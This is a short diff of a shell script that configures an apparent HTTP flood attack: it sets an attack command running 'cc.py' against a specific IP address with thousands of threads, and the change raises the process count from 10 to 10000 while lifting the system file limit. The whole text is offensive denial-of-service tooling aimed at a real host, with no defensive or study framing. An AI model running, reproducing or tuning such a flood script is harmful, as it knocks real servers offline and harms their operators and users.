@@ -9,7 +9,7 @@
 atk_cmd="python3 cc.py -url http://88.198.18.78 -v 4 -s 120 -t 10000"
 
 #number of process that you want
-process=10
+process=10000
 
 #change the system limit
 ulimit -n 999999
